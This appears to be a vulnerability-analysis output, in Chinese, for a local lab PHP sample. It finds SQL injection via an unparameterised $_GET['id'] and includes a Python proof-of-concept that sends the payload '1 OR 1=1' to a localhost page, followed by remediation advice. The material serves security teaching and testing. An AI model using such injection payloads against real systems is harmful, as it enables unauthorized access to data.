@@ -1,0 +1,85 @@
+```json
+{
+  "sample_id": "S003",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['id'] 读取外部输入，未做类型校验或范围限制",
+    "flow": "F01:0010 将 $id 直接拼接到 SELECT 语句的 WHERE id = 后，形成动态SQL",
+    "guard": "无效：没有预处理、没有整数转换、没有白名单；F01:0022-F01:0023 的 htmlspecialchars 仅用于HTML输出转义，不能保护SQL构造",
+    "sink": "F01:0011 $db->query($sql) 执行拼接后的SQL，查询结果随后被取出并展示"
+  },
+  "prerequisites": [
+    "PHP 页面可通过 http://127.0.0.1:4280/lab_cases/S003/index.php 访问",
+    "公共连接文件已提供可用的 mysqli 变量 $db",
+    "MariaDB 中 lab_people 表存在并预置 1 Alice、2 Bob、3 Carol",
+    "GET 参数 id 可传入且无需登录"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现未在输入中展示；运行上下文声明其提供已连接的 mysqli 变量 $db"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "将脚本保存为 s003_poc.py 后运行：python3 s003_poc.py。脚本只访问 http://127.0.0.1:4280/lab_cases/S003/index.php，不修改数据库。普通输入 id=1 预期正文包含 Alice 且不包含 Bob/Carol；测试输入 id=1 OR 1=1 预期正文包含 Alice、Bob、Carol，体现 WHERE 条件被改变。不要用 HTTP 200 作为成功条件，而应比较页面正文中的记录标记；失败时检查服务是否监听 127.0.0.1:4280、lab_people 是否已初始化、$db 是否能连接、页面是否返回“查询失败”。本方案未运行验证。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+# S003 本地教学验证脚本：仅访问 127.0.0.1:4280，不修改数据库。
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/lab_cases/S003/index.php"
+TIMEOUT = 5
+
+def fetch(payload: str) -> str:
+    query = urllib.parse.urlencode({"id": payload})
+    url = f"{BASE}?{query}"
+    req = urllib.request.Request(url, method="GET")
+    with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
+        body = resp.read()
+    return body.decode("utf-8", errors="replace")
+
+def main() -> None:
+    cases = [
+        ("normal", "1"),
+        ("test", "1 OR 1=1"),
+    ]
+
+    results = {}
+    for name, payload in cases:
+        print(f"[{name}] id={payload!r}")
+        try:
+            body = fetch(payload)
+        except Exception as exc:
+            print(f"  请求失败: {exc}")
+            print("  检查：服务是否监听 127.0.0.1:4280；页面路径是否正确。")
+            return
+        results[name] = body
+        print(f"  正文长度: {len(body)}")
+        print(f"  包含 Alice: {'Alice' in body}")
+        print(f"  包含 Bob: {'Bob' in body}")
+        print(f"  包含 Carol: {'Carol' in body}")
+        print(f"  包含“查询失败”: {'查询失败' in body}")
+
+    normal = results.get("normal", "")
+    test = results.get("test", "")
+
+    normal_ok = ("Alice" in normal) and ("Bob" not in normal) and ("Carol" not in normal)
+    test_changed = ("Alice" in test) and ("Bob" in test) and ("Carol" in test)
+
+    print("\n比较结果（仅作运行观察，不以 HTTP 200 为成功条件）：")
+    print(f"  普通输入符合预期记录范围: {normal_ok}")
+    print(f"  测试输入出现记录范围变化: {test_changed}")
+    if not normal_ok:
+        print("  请检查 lab_people 是否预置 1 Alice、2 Bob、3 Carol，以及数据库连接是否正常。")
+    if not test_changed:
+        print("  若普通输入正常但测试未变化，请检查实际代码是否已改为预处理/整数转换，或请求是否被拦截。")
+
+if __name__ == "__main__":
+    main()
+```
+
+防护建议（修复方向，未作为已验证事实）：将 `id` 作为整数参数使用 MySQLi 预处理绑定；不要依赖输出转义保护 SQL；如未来出现动态列名、排序表达式或 IN 列表，应使用严格白名单而非直接拼接。
